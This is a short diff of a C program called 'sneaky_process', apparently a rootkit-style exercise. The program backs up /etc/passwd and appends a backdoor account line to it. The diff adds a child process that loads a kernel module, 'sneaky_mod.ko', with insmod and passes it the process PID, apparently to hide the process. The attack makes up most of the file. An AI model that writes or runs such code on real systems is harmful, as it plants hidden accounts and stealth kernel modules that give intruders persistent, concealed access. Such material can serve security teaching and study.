@@ -1,8 +1,6 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
-#include "sneaky_mod.c"
-
 int main() {
   int rc = fork();  
   printf("sneaky_process pid=%d\n", getpid());
@@ -15,11 +13,29 @@ int main() {
     myargs[1] = strdup("/etc/passwd");
     myargs[2] = strdup("/tmp/passwd");
     execvp(myargs[0], myargs);
-  } else {    
+  } else {        
     FILE * target = fopen("/etc/passwd", "a");
     char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
     fprintf(target, "%s", append); 
-    fclose(target);
+    fclose(target);  
+    int _rc = fork();
+    printf("sneaky_process pid=%d\n", getpid()); 
+    if (_rc == 0) {      
+      char * args[3];
+      args[0] = strdup("insmod");
+      args[1] = strdup("sneaky_mod.ko");   
+      char buf[20];
+      sprintf(buf, "PID = %d", getpid());
+      args[2] = strdup(buf);    
+      printf("HERE\n");
+      execvp(args[0], args);  
+    } else {
+    
+      
+
+      
+    }
+    
   }
   return 0;
 }
